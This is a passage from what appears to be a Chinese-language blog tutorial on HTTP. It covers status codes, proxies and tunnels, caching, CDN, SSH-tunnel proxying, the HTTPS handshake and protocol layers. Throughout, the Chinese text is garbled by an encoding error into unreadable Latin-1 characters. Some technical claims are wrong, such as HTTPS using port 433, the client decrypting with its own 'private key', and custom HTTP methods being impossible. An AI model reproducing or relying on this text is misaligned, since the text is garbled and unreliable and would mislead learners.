style="text-align:right">æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„ç½‘é¡µã€‚</td></tr><tr><td><code>405 Method Not Allowed</code></td><td style="text-align:right">ç¦ç”¨è¯·æ±‚ä¸­æŒ‡å®šçš„æ–¹æ³•ã€‚</td></tr><tr><td><code>406 Not Acceptable</code></td><td style="text-align:right">æ— æ³•ä½¿ç”¨è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å“åº”è¯·æ±‚çš„ç½‘é¡µã€‚</td></tr><tr><td><code>407 Proxy Authentication Required</code></td><td style="text-align:right">æ­¤çŠ¶æ€ä»£ç ä¸ 401ï¼ˆæœªæˆæƒï¼‰ç±»ä¼¼ï¼Œä½†æŒ‡å®šè¯·æ±‚è€…åº”å½“æˆæƒä½¿ç”¨ä»£ç†ã€‚</td></tr><tr><td><code>408 Request Timeout</code></td><td style="text-align:right">æœåŠ¡å™¨ç­‰å€™è¯·æ±‚æ—¶å‘ç”Ÿè¶…æ—¶ã€‚</td></tr><tr><td><code>409 Conflict</code></td><td style="text-align:right">ç”±äºå’Œè¢«è¯·æ±‚çš„èµ„æºçš„å½“å‰çŠ¶æ€ä¹‹é—´å­˜åœ¨å†²çªï¼Œè¯·æ±‚æ— æ³•å®Œæˆã€‚</td></tr><tr><td><code>410 Gone</code></td><td style="text-align:right">è¢«è¯·æ±‚çš„èµ„æºåœ¨æœåŠ¡å™¨ä¸Šå·²ç»ä¸å†å¯ç”¨ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•å·²çŸ¥çš„è½¬å‘åœ°å€ã€‚</td></tr><tr><td><code>411 Length Required</code></td><td style="text-align:right">æœåŠ¡å™¨æ‹’ç»åœ¨æ²¡æœ‰å®šä¹‰ Content-Length å¤´çš„æƒ…å†µä¸‹æ¥å—è¯·æ±‚ã€‚</td></tr><tr><td><code>412 Precondition Failed</code></td><td style="text-align:right">æœåŠ¡å™¨åœ¨éªŒè¯åœ¨è¯·æ±‚çš„å¤´å­—æ®µä¸­ç»™å‡ºå…ˆå†³æ¡ä»¶æ—¶ï¼Œæ²¡èƒ½æ»¡è¶³å…¶ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªã€‚</td></tr><tr><td><code>413 Payload Too Large</code></td><td style="text-align:right">æœåŠ¡å™¨æ‹’ç»å¤„ç†å½“å‰è¯·æ±‚ï¼Œå› ä¸ºè¯¥è¯·æ±‚æäº¤çš„å®ä½“æ•°æ®å¤§å°è¶…è¿‡äº†æœåŠ¡å™¨æ„¿æ„æˆ–è€…èƒ½å¤Ÿå¤„ç†çš„èŒƒå›´ã€‚</td></tr><tr><td><code>414 URI Too Long</code></td><td style="text-align:right">è¯·æ±‚çš„ URIï¼ˆé€šå¸¸ä¸ºç½‘å€ï¼‰è¿‡é•¿ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ã€‚</td></tr><tr><td><code>415 Unsupported Media Type</code></td><td style="text-align:right">è¯·æ±‚ä¸­æäº¤çš„å®ä½“å¹¶ä¸æ˜¯æœåŠ¡å™¨ä¸­æ‰€æ”¯æŒçš„æ ¼å¼ï¼Œè¯·æ±‚è¢«æ‹’ç»</td></tr><tr><td><code>416 Requested Range Not Satisfiable</code></td><td style="text-align:right">è¯·æ±‚ä¸­åŒ…å«äº† Range è¯·æ±‚å¤´ï¼Œå¹¶ä¸” Range ä¸­æŒ‡å®šçš„ä»»ä½•æ•°æ®èŒƒå›´éƒ½ä¸å½“å‰èµ„æºçš„å¯ç”¨èŒƒå›´ä¸é‡åˆï¼ŒåŒæ—¶è¯·æ±‚ä¸­åˆæ²¡æœ‰å®šä¹‰ If-Range è¯·æ±‚å¤´</td></tr><tr><td><code>417 Expectation Failed</code></td><td style="text-align:right">æœåŠ¡å™¨æœªæ»¡è¶³â€æœŸæœ›â€è¯·æ±‚æ ‡å¤´å­—æ®µçš„è¦æ±‚ã€‚</td></tr><tr><td>5å¼€å¤´ï¼ˆæœåŠ¡å™¨é”™è¯¯ï¼‰è¿™äº›çŠ¶æ€ä»£ç è¡¨ç¤ºæœåŠ¡å™¨åœ¨å°è¯•å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿå†…éƒ¨é”™è¯¯ã€‚ è¿™äº›é”™è¯¯å¯èƒ½æ˜¯æœåŠ¡å™¨æœ¬èº«çš„é”™è¯¯ï¼Œè€Œä¸æ˜¯è¯·æ±‚å‡ºé”™ã€‚</td><td style="text-align:right"></td></tr><tr><td><code>500 Internal Server Error</code></td><td style="text-align:right">æœåŠ¡å™¨é‡åˆ°äº†ä¸çŸ¥é“å¦‚ä½•å¤„ç†çš„æƒ…å†µã€‚</td></tr><tr><td><code>501 Not Implemented</code></td><td style="text-align:right">æ­¤è¯·æ±‚æ–¹æ³•ä¸è¢«æœåŠ¡å™¨æ”¯æŒä¸”æ— æ³•è¢«å¤„ç†ã€‚</td></tr><tr><td><code>502 Bad Gateway</code></td><td style="text-align:right">æ­¤é”™è¯¯å“åº”è¡¨æ˜æœåŠ¡å™¨ä½œä¸ºç½‘å…³éœ€è¦å¾—åˆ°ä¸€ä¸ªå¤„ç†è¿™ä¸ªè¯·æ±‚çš„å“åº”ï¼Œä½†æ˜¯å¾—åˆ°ä¸€ä¸ªé”™è¯¯çš„å“åº”ã€‚</td></tr><tr><td><code>503 Service Unavailable</code></td><td style="text-align:right">æœåŠ¡å™¨æ²¡æœ‰å‡†å¤‡å¥½å¤„ç†è¯·æ±‚ã€‚ å¸¸è§åŸå› æ˜¯æœåŠ¡å™¨å› ç»´æŠ¤æˆ–é‡è½½è€Œåœæœºã€‚</td></tr><tr><td><code>504 Gateway Timeout</code></td><td style="text-align:right">å½“æœåŠ¡å™¨ä½œä¸ºç½‘å…³ï¼Œä¸èƒ½åŠæ—¶å¾—åˆ°å“åº”æ—¶è¿”å›æ­¤é”™è¯¯ä»£ç ã€‚</td></tr><tr><td><code>505 HTTP Version Not Supported</code></td><td style="text-align:right">æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚ä¸­æ‰€ç”¨çš„ HTTP åè®®ç‰ˆæœ¬ã€‚</td></tr></tbody></table><p><br></p><h3 id="5-WebæœåŠ¡å™¨"><a href="#5-WebæœåŠ¡å™¨" class="headerlink" title="5. WebæœåŠ¡å™¨"></a>5. WebæœåŠ¡å™¨</h3><p>HTTP/1.1å…è®¸ä¸€å°HTTPæœåŠ¡å™¨æ­å»ºå¤šä¸ªWebç«™ç‚¹ã€‚å³ä½¿ç‰©ç†å±‚é¢åªæœ‰ä¸€å°æœåŠ¡å™¨ï¼Œä½†åªè¦ä½¿ç”¨è™šæ‹Ÿä¸»æœºçš„åŠŸèƒ½ï¼Œåˆ™å¯ä»¥å‡è±¡å·²å…·æœ‰å¤šå°æœåŠ¡å™¨ã€‚åŸŸåé€šè¿‡DNSæœåŠ¡æ˜ å°„åˆ°IPåœ°å€ï¼Œå½“è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨æ—¶ï¼Œå·²ç»æ˜¯ä»¥IPå½¢å¼è®¿é—®äº†ã€‚</p><p>ç”±äºè™šæ‹Ÿä¸»æœºå¯ä»¥å¯„å­˜å¤šä¸ªä¸åŒåŸŸåçš„webç½‘ç«™ï¼Œå› æ­¤åœ¨å‘é€httpè¯·æ±‚æ—¶ï¼Œå¿…é¡»åœ¨Hosté¦–éƒ¨å®Œæ•´æŒ‡å®šåŸŸåçš„URIã€‚</p><p><br></p><h4 id="5-1-ä»£ç†ã€ç½‘å…³ã€éš§é“"><a href="#5-1-ä»£ç†ã€ç½‘å…³ã€éš§é“" class="headerlink" title="5.1 ä»£ç†ã€ç½‘å…³ã€éš§é“"></a>5.1 ä»£ç†ã€ç½‘å…³ã€éš§é“</h4><p>HTTPé€šä¿¡æ—¶ï¼Œé™¤äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ„å¤–ï¼Œè¿˜æœ‰ä¸€äº›ç”¨äºé€šä¿¡æ•°æ®è½¬å‘çš„åº”ç”¨ç¨‹åºã€‚å®ƒä»¬å°†è¯·æ±‚è½¬å‘ç»™é€šä¿¡çº¿è·¯ä¸Šçš„ä¸‹ä¸€ç«™æœåŠ¡å™¨ï¼Œæˆ–è€…å°†æœåŠ¡å™¨å‘é€çš„å“åº”è½¬å‘ç»™å®¢æˆ·ç«¯ã€‚</p><p><em>ä»£ç†</em><br><strong>ä½œç”¨</strong>ï¼šåˆ©ç”¨ç¼“å­˜æŠ€æœ¯å‡å°‘ç½‘ç»œå¸¦å®½çš„æµé‡ï¼Œç»„ç»‡å†…éƒ¨é’ˆå¯¹ç‰¹å®šç½‘ç«™çš„è®¿é—®æ§åˆ¶ï¼Œä»¥è·å–è®¿é—®æ—¥å¿—ä¸ºä¸»è¦ç›®çš„ã€‚<br><strong>ç¼“å­˜ä»£ç†</strong>ï¼šä»£ç†è½¬å‘å“åº”æ—¶ï¼Œç¼“å­˜ä»£ç†ä¼šé¢„å…ˆå°†èµ„æºçš„å‰¯æœ¬ä¿å­˜åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šã€‚å½“ä»£ç†å†æ¬¡æ¥æ”¶åˆ°ç›¸åŒèµ„æºè¯·æ±‚æ—¶ï¼Œå¯ä»¥ä¸ä»æœåŠ¡å™¨é‚£é‡Œè·å–ï¼Œè€Œæ˜¯å°†ä¹‹å‰ç¼“å­˜çš„èµ„æºä½œä¸ºå“åº”è¿”å›ã€‚<br><strong>é€æ˜ä»£ç†</strong>ï¼šè½¬å‘è¯·æ±‚æˆ–å“åº”æ—¶ï¼Œä¸å¯¹æŠ¥æ–‡åšä»»ä½•åŠ å·¥çš„ä»£ç†ã€‚</p><p><em>ç½‘å…³</em><br>ç½‘å…³èƒ½ä½¿é€šä¿¡çº¿è·¯ä¸Šçš„æœåŠ¡å™¨æä¾›éHTTPåè®®æœåŠ¡ã€‚åˆ©ç”¨ç½‘å…³å¯ä»¥æé«˜é€šä¿¡çš„å®‰å…¨æ€§ï¼Œåœ¨é€šä¿¡çº¿è·¯ä¸ŠåŠ å¯†ï¼›ç½‘å…³å¯ä»¥è¿æ¥æ•°æ®åº“ï¼Œä½¿ç”¨sqlè¯­å¥æŸ¥è¯¢æ•°æ®ã€‚</p><p><em>éš§é“</em><br>éš§é“å¯æŒ‰è¦æ±‚å»ºç«‹èµ·ä¸€æ¡ä¸å…¶ä»–æœåŠ¡å™¨çš„é€šä¿¡çº¿è·¯ï¼Œä½¿ç”¨SSLç­‰åŠ å¯†æ‰‹æ®µè¿›è¡Œé€šä¿¡ã€‚ç¡®ä¿å®¢æˆ·ç«¯èƒ½ä¸æœåŠ¡å™¨è¿›è¡Œå®‰å…¨çš„é€šä¿¡ã€‚</p><p><br></p><h4 id="5-2-ç¼“å­˜"><a href="#5-2-ç¼“å­˜" class="headerlink" title="5.2 ç¼“å­˜"></a>5.2 ç¼“å­˜</h4><p>ç¼“å­˜æ˜¯æŒ‡ä»£ç†æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯æœ¬åœ°ç£ç›˜å†…ä¿å­˜çš„èµ„æºå‰¯æœ¬ã€‚</p><p><em>å®¢æˆ·ç«¯çš„ç¼“å­˜</em><br>å­˜åœ¨äºå®¢æˆ·ç«¯æµè§ˆå™¨ä¸­çš„æ–‡ä»¶ï¼Œæˆä¸ºä¸´æ—¶ç½‘ç»œæ–‡ä»¶ï¼ˆTemporary Internet Fileï¼‰ã€‚æµè§ˆå™¨ç¼“å­˜å¦‚æœæœ‰æ•ˆï¼Œå¯ä»¥ç›´æ¥ä»æœ¬åœ°ç£ç›˜å†…è¯»å–ã€‚</p><p><em>ç¼“å­˜çš„æœ‰æ•ˆæœŸé™</em><br>å³ä½¿å­˜åœ¨ç¼“å­˜ï¼Œä¹Ÿä¼šå› ä¸ºå®¢æˆ·ç«¯çš„è¦æ±‚ã€ç¼“å­˜çš„æœ‰æ•ˆæœŸç­‰å› ç´ ï¼Œå‘æºæœåŠ¡å™¨ç¡®è®¤èµ„æºçš„æœ‰æ•ˆæ€§ã€‚è‹¥åˆ¤æ–­ç¼“å­˜å¤±æ•ˆï¼Œç¼“å­˜æœåŠ¡å™¨å°†å†æ¬¡ä»æºæœåŠ¡å™¨ä¸Šè·å–æ–°èµ„æºã€‚</p><p>ç¼“å­˜å¯ä»¥ç®€å•åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šå¼ºç¼“å­˜(200 from cache) ä¸åå•†ç¼“å­˜(304)ã€‚å¯¹äºåå•†ç¼“å­˜ï¼Œä½¿ç”¨ctrl + F5å¼ºåˆ¶åˆ·æ–°å¯ä»¥ä½¿å¾—ç¼“å­˜æ— æ•ˆã€‚ä½†æ˜¯å¯¹äºå¼ºç¼“å­˜ï¼Œåœ¨æœªè¿‡æœŸæ—¶ï¼Œå¿…é¡»æ›´æ–°èµ„æºè·¯å¾„æ‰èƒ½å‘èµ·æ–°çš„è¯·æ±‚ï¼ˆæ›´æ”¹è·¯å¾„ç›¸å½“äºæ˜¯å¦ä¸€ä¸ªèµ„æºï¼‰ã€‚</p><p><strong>å¼ºç¼“å­˜(200 from cache)</strong><br>æµè§ˆå™¨å¦‚æœåˆ¤æ–­æœ¬åœ°ç¼“å­˜æœªè¿‡æœŸï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œæ— éœ€å‘èµ·httpè¯·æ±‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> å±äºå¼ºç¼“å­˜</span><br><span class="line">(http1.1)Cache-Control/Max-Age</span><br><span class="line">(http1.0)Pragma/Expires</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><p><strong>åå•†ç¼“å­˜(304)</strong><br>æµè§ˆå™¨ä¼šå‘æœåŠ¡ç«¯å‘èµ· http è¯·æ±‚ï¼Œç„¶åæœåŠ¡ç«¯å‘Šè¯‰æµè§ˆå™¨æ–‡ä»¶æœªæ”¹å˜ï¼Œè®©æµè§ˆå™¨ä½¿ç”¨æœ¬åœ°ç¼“å­˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> å±äºåå•†ç¼“å­˜</span><br><span class="line">(http1.1)If-None-Match/E-TAG</span><br><span class="line">(HTTP1.0)If-Modified-Since/Last-Modified</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-å¸¸è§é—®é¢˜"><a href="#6-å¸¸è§é—®é¢˜" class="headerlink" title="6. å¸¸è§é—®é¢˜"></a>6. å¸¸è§é—®é¢˜</h3><h4 id="6-1-CDNåŸç†"><a href="#6-1-CDNåŸç†" class="headerlink" title="6.1 CDNåŸç†"></a><em>6.1 CDNåŸç†</em></h4><p>å½“æˆ‘ä»¬åœ¨åœ°å€æ è¾“å…¥ä¸€ä¸ªç½‘å€ï¼Œæµè§ˆå™¨å‘ç°æœ¬åœ°æ²¡æœ‰å…³äºè¿™ä¸ªç½‘å€çš„ DNS ç¼“å­˜ï¼Œæ‰€ä»¥å‘ç½‘ç«™çš„ DNS æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚<br>ç½‘ç«™çš„ DNS æœåŠ¡å™¨è®¾ç½®äº† CNAMEï¼ŒæŒ‡å‘äº†æŸä¸ª CDN æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„é˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€‚<br>å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è®¿é—®è¯¥å†…å®¹ï¼ŒCDN æœåŠ¡å™¨ä¼šå‘æºç«™è¯·æ±‚æ•°æ®å¹¶ç¼“å­˜ã€‚<br>å¦åˆ™ï¼ŒCDNæœåŠ¡å™¨ä¼šæ‰¾åˆ° ç¼“å­˜äº†è¿™ä¸ªèµ„æºï¼Œå¹¶å¯¹ç”¨æˆ·å“åº”æœ€å¿«çš„èŠ‚ç‚¹è¿”å›ç»™ç”¨æˆ·ï¼Œç„¶åç”¨æˆ·å‘è¯¥èŠ‚ç‚¹å‘å‡ºè¯·æ±‚ã€‚</p><p><br></p><h4 id="6-2-shadowsockåŸç†"><a href="#6-2-shadowsockåŸç†" class="headerlink" title="6.2 shadowsockåŸç†"></a><em>6.2 shadowsockåŸç†</em></h4><p>åœ¨å¾ˆä¹…å¾ˆä¹…ä»¥å‰ï¼Œæˆ‘ä»¬è®¿é—®å„ç§ç½‘ç«™éƒ½æ˜¯ç®€å•è€Œç›´æ¥çš„ï¼Œç”¨æˆ·çš„è¯·æ±‚é€šè¿‡äº’è”ç½‘å‘é€åˆ°æœåŠ¡æä¾›æ–¹ï¼ŒæœåŠ¡æä¾›æ–¹ç›´æ¥å°†ä¿¡æ¯åé¦ˆç»™ç”¨æˆ·ã€‚</p><p>ç„¶åæœ‰ä¸€å¤©ï¼ŒGFW å°±å‡ºç°äº†ï¼Œä»–åƒä¸€é¢å¢™ï¼Œæ¯å½“ç”¨æˆ·éœ€è¦è·å–ä¿¡æ¯ï¼Œéƒ½ç»è¿‡äº† GFWï¼ŒGFW å°†å®ƒä¸å–œæ¬¢çš„å†…å®¹ç»Ÿç»Ÿè¿‡æ»¤æ‰ï¼Œäºæ˜¯å®¢æˆ·å½“è§¦å‘ GFW çš„è¿‡æ»¤è§„åˆ™çš„æ—¶å€™ï¼Œå°±ä¼šæ”¶åˆ° Connection Reset è¿™æ ·çš„å“åº”å†…å®¹ï¼Œè€Œæ— æ³•æ¥æ”¶åˆ°æ­£å¸¸çš„å†…å®¹ã€‚</p><p>èªæ˜çš„äººä»¬æƒ³åˆ°äº†åˆ©ç”¨å¢ƒå¤–æœåŠ¡å™¨ä»£ç†çš„æ–¹æ³•æ¥ç»•è¿‡ GFW çš„è¿‡æ»¤ï¼Œå…¶ä¸­åŒ…å«äº†å„ç§ HTTP ä»£ç†æœåŠ¡ã€Socks æœåŠ¡ã€Ã—Ã—Ã— æœåŠ¡â€¦ å…¶ä¸­ä»¥ ssh tunnel çš„æ–¹æ³•æ¯”è¾ƒæœ‰ä»£è¡¨æ€§</p><ul><li>é¦–å…ˆç”¨æˆ·å’Œå¢ƒå¤–æœåŠ¡å™¨åŸºäº ssh å»ºç«‹èµ·ä¸€æ¡åŠ å¯†çš„é€šé“</li><li>ç”¨æˆ·é€šè¿‡å»ºç«‹èµ·çš„éš§é“è¿›è¡Œä»£ç†ï¼Œé€šè¿‡ ssh server å‘çœŸå®çš„æœåŠ¡å‘èµ·è¯·æ±‚</li><li>æœåŠ¡é€šè¿‡ ssh serverï¼Œå†é€šè¿‡åˆ›å»ºå¥½çš„éš§é“è¿”å›ç»™ç”¨æˆ·</li></ul><p><br></p><h4 id="6-3-Https"><a href="#6-3-Https" class="headerlink" title="6.3 Https"></a><em>6.3 Https</em></h4><p>HTTPåè®®ï¼Œæœ¬èº«æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œå› æ­¤å¾ˆå®¹æ˜“åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«ä¸­é—´è¿™çªƒå¬ã€ç¯¡æ”¹ã€å†’å……ã€‚ï¼ˆWifiçƒ­ç‚¹ï¼Œè·¯ç”±å™¨ï¼Œé˜²ç«å¢™ï¼Œåå‘ä»£ç†ï¼Œç¼“å­˜æœåŠ¡å™¨ï¼‰ã€‚ä¸ºäº†è§£å†³è¿™äº›é£é™©ï¼ŒHTTPSçš„ä»·å€¼å°±ä½“ç°å‡ºæ¥äº†</p><ul><li>å†…å®¹åŠ å¯†ï¼Œç¬¬ä¸‰æ–¹æ— æ³•çªƒå¬ã€‚</li><li>èº«ä»½è®¤è¯ï¼Œä¸€æ—¦è¢«ç¯¡æ”¹ï¼Œé€šä¿¡åŒæ–¹ä¼šç«‹åˆ»å‘ç°ã€‚</li><li>æ•°æ®å®Œæ•´æ€§ã€‚é˜²æ­¢å†…å®¹å†’å……æˆ–è€…ç¯¡æ”¹ã€‚</li></ul><p><br><br>HTTPSï¼Œå³HTTPä¸‹åŠ å…¥SSLå±‚ã€‚HTTP + SSL/TLSã€‚HTTPSçš„æ•´ä¸ªäº¤äº’è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”¨æˆ·åœ¨æµè§ˆå™¨é‡Œè¾“å…¥ä¸€ä¸ªhttpsç½‘å€ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯å‘èµ·httpsè¯·æ±‚ï¼Œé€šè¿‡tcpå’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥(433ç«¯å£)ã€‚</li><li>æœåŠ¡å™¨å­˜æ”¾CAè¯ä¹¦è¿›è¡Œå¤„ç†ï¼Œæ³¨æ„ç”¨HTTPSçš„æœåŠ¡å™¨å¿…é¡»è¦æœ‰ä¸€å¥—æ•°å­—è¯ä¹¦ï¼Œè¿™å¥—è¯ä¹¦å…¶å®ä¸€å¯¹å…¬é’¥å’Œç§é’¥ã€‚</li><li>æœåŠ¡å™¨å‘å®¢æˆ·ç«¯è¿”å›è¯ä¹¦ã€‚è¯ä¹¦åŒ…å«ï¼šåŸŸåï¼Œç”³è¯·è¯ä¹¦çš„å…¬å¸ï¼Œå…¬é’¥ã€‚</li><li>å®¢æˆ·ç«¯å¯¹è¯ä¹¦è¿›è¡Œè§£æã€‚è¿™ä¸ªå·¥ä½œç”±å®¢æˆ·ç«¯çš„TLSå®Œæˆï¼Œé¦–å…ˆä¼šéªŒè¯å…¬é’¥æ˜¯å¦æœ‰æ•ˆï¼Œå¦‚é¢å‘æœºæ„ï¼Œè¿‡æœŸæ—¶é—´ç­‰ã€‚å¦‚æœå‘ç°å¼‚å¸¸ï¼Œå°±ä¼šå¼¹å‡ºä¸€ä¸ªè­¦å‘Šæ¡†ï¼Œæç¤ºè¯ä¹¦å­˜åœ¨é—®é¢˜ã€‚å¦‚æœè¯ä¹¦æ²¡æœ‰é—®é¢˜ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œç„¶åç”¨è¯ä¹¦å¯¹è¯¥éšæœºæ•°è¿›è¡ŒåŠ å¯†ã€‚</li><li>å‘æœåŠ¡å™¨å‘é€è¯ä¹¦åŠ å¯†åçš„éšæœºæ•°</li><li>æœåŠ¡å™¨ç”¨å®ƒçš„ç§å¯†è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å®¢æˆ·ç«¯ä¼ æ¥çš„éšæœºæ•°</li><li>æœåŠ¡å™¨ç”¨å®¢æˆ·ç«¯çš„éšæœºæ•°åŠ å¯†åçš„ä¿¡æ¯å‘é€ç»™å®¢æˆ·ç«¯</li><li>å®¢æˆ·ç«¯ç”¨ä¹‹å‰ç”Ÿæˆçš„ç§é’¥è§£å¯†æœåŠ¡ç«¯ä¼ è¿‡æ¥çš„ä¿¡æ¯</li></ul><p><br></p><h4 id="6-4-è‡ªå®šä¹‰HTTPè¯·æ±‚æ–¹æ³•ï¼Ÿ"><a href="#6-4-è‡ªå®šä¹‰HTTPè¯·æ±‚æ–¹æ³•ï¼Ÿ" class="headerlink" title="6.4 è‡ªå®šä¹‰HTTPè¯·æ±‚æ–¹æ³•ï¼Ÿ"></a><em>6.4 è‡ªå®šä¹‰HTTPè¯·æ±‚æ–¹æ³•ï¼Ÿ</em></h4><p>ä¸èƒ½ã€‚<br>HTTP1.0å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š GETã€POSTã€HEAD<br>HTTP1.1æ–°å¢äº†äº”ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONSã€PUTã€DELETEã€TRACE ã€CONNECT</p><p><br></p><h4 id="6-5-å¤šä¸ªåŸŸååŠ è½½èµ„æº"><a href="#6-5-å¤šä¸ªåŸŸååŠ è½½èµ„æº" class="headerlink" title="6.5 å¤šä¸ªåŸŸååŠ è½½èµ„æº"></a><em>6.5 å¤šä¸ªåŸŸååŠ è½½èµ„æº</em></h4><p>Q: ä¸ºä»€ä¹ˆåŒä¸€ç½‘ç«™çš„èµ„æºè¦ä½¿ç”¨ä¸åŒåŸŸååŠ è½½(oss,cdn)<br>A: æµè§ˆå™¨å¯¹åŒä¸€æœ‰è¿æ¥æ•°çš„é™åˆ¶ã€‚</p><p><br></p><h4 id="6-6-TCP-UDP-IP-HTTPçš„åŒºåˆ«"><a href="#6-6-TCP-UDP-IP-HTTPçš„åŒºåˆ«" class="headerlink" title="6,6 TCP, UDP, IP, HTTPçš„åŒºåˆ«"></a><em>6,6 TCP, UDP, IP, HTTPçš„åŒºåˆ«</em></h4><p>TCP, UDPæ˜¯ä¼ è¾“å±‚åè®®ï¼ŒIPæ˜¯ç½‘ç»œå±‚åè®®ï¼ŒHTTPæ˜¯åº”ç”¨å±‚åè®®ã€‚</p><ul><li>IP<br>æ˜¯ç”¨æ¥æ‰¾åˆ°ç›®æ ‡è®¡ç®—æœºã€‚å¦‚Aå‘Bå‘é€æ•°æ®ï¼Œé‚£ä¹ˆè¦æ‰¾åˆ°å¯¹æ–¹Bçš„è®¡ç®—æœºï¼Œæ‰¾åˆ°åå°±ç¡®å®šäº†ç½‘ç»œé—´çš„é€šé“ï¼ŒA - Bã€‚ä¹Ÿå°±æ˜¯è¯´IPæ˜¯æ¥ç¡®å®šç½‘ç»œé—´çš„è·¯å¾„çš„ã€‚</li><li>TCP<br>æ˜¯ç”¨æ¥å®ç°é€šä¿¡çš„ï¼Œåœ¨IPå®ç°äº†ç½‘ç»œé—´è·¯å¾„åï¼ŒTCPæä¾›äº†è¿™ä¸ªè·¯å¾„çš„å…¨åŒå·¥é€šä¿¡çš„èƒ½åŠ›ã€‚è¿™ä¸ªé“¾æ¥çš„å»ºç«‹è¦ç»å†ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ–­å¼€é“¾æ¥è¦å››æ¬¡æŒ¥æ‰‹ã€‚ï¼ˆå…¨åŒå·¥ï¼šAå¯ä»¥ç»™Bå‘é€æ•°æ®çš„åŒæ—¶ï¼ŒBä¹Ÿå¯ä»¥ç»™Aå‘é€æ•°æ®ï¼‰</li><li>UDP<br>æ˜¯å’ŒTCPç›¸ä¼¼çš„ï¼Œä¹Ÿæ˜¯æä¾›äº†é€šä¿¡èƒ½åŠ›ã€‚ä¸è¿‡å’ŒTCPæœ‰åŒºåˆ«ã€‚TCPæ˜¯ç‚¹å¯¹ç‚¹çš„é€šè®¯ï¼ŒUDPæ”¯æŒä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€ï¼Œä¸€å¯¹ä¸€ç­‰ã€‚UDPä¸éœ€è¦é“¾æ¥ï¼Œç›´æ¥å‘æ•°æ®ï¼Œç›¸å¯¹æ¥è¯´é€Ÿåº¦æ›´å¿«ï¼Œä½†æ˜¯ä¸ä¿è¯æ•°æ®ä¸€å®šä¼šåˆ°è¾¾ï¼Œé€‚åˆå¹¿æ’­ã€‚</li><li>HTTP<br>httpæ˜¯åº”ç”¨å±‚çš„åè®®ï¼Œå®ƒå®ç°äº†æ€ä¹ˆå‘æ•°æ®å’Œæ€ä¹ˆæ”¶æ•°æ®ï¼Œå®šä¹‰äº†æ”¶å‘çš„æ ¼å¼</li></ul><p><br></p><h4 id="6-7-HTTP-2-0"><a href="#6-7-HTTP-2-0" class="headerlink" title="6.7.HTTP 2.0"></a><em>6.7.HTTP 2.0</em></h4><p><strong>å»¶è¿Ÿ</strong><br>å½±å“ä¸€ä¸ª HTTP ç½‘ç»œè¯·æ±‚çš„å› ç´ ä¸»è¦æœ‰ä¸¤ä¸ªï¼šå¸¦å®½å’Œå»¶è¿Ÿã€‚</p><ul><li>æµè§ˆå™¨é˜»å¡<br>æµè§ˆå™¨å¯¹äºåŒä¸€ä¸ªåŸŸåæœ‰è¿æ¥æ•°é™åˆ¶ã€‚è¶…è¿‡æµè§ˆå™¨æœ€å¤§è¿æ¥æ•°é™åˆ¶ï¼Œåç»­è¯·æ±‚å°±ä¼šè¢«é˜»å¡ã€‚</li><li>DNS æŸ¥è¯¢<br>æµè§ˆå™¨éœ€è¦çŸ¥é“ç›®æ ‡æœåŠ¡å™¨çš„ IP æ‰èƒ½å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨ DNS ç¼“å­˜å¯ä»¥å‡å°‘è¿™ä¸ªæ—¶é—´</li><li>å»ºç«‹è¿æ¥<br>HTTP æ˜¯åŸºäº TCP åè®®çš„ï¼Œæµè§ˆå™¨æœ€å¿«ä¹Ÿè¦åœ¨ç¬¬ä¸‰æ¬¡æ¡æ‰‹æ—¶æ‰èƒ½æå¸¦ HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œè¾¾åˆ°çœŸæ­£çš„å»ºç«‹è¿æ¥ï¼Œä½†æ˜¯è¿™äº›è¿æ¥æ— æ³•å¤ç”¨ä¼šå¯¼è‡´æ¯æ¬¡è¯·æ±‚éƒ½ç»å†ä¸‰æ¬¡æ¡æ‰‹å’Œæ…¢å¯åŠ¨ã€‚ä¸‰æ¬¡æ¡æ‰‹åœ¨é«˜å»¶è¿Ÿçš„åœºæ™¯ä¸‹å½±å“è¾ƒæ˜æ˜¾ï¼Œæ…¢å¯åŠ¨åˆ™å¯¹æ–‡ä»¶ç±»å¤§è¯·æ±‚å½±å“è¾ƒå¤§ã€‚</li></ul><p><br><br><strong> HTTP1.0å’ŒHTTP1.1çš„åŒºåˆ«</strong></p><ul><li>ç¼“å­˜å¤„ç†<br>HTTP1.0ä¸­ä½¿ç”¨If-Modified-Since,Expiresæ¥åšç¼“å­˜åˆ¤æ–­çš„æ 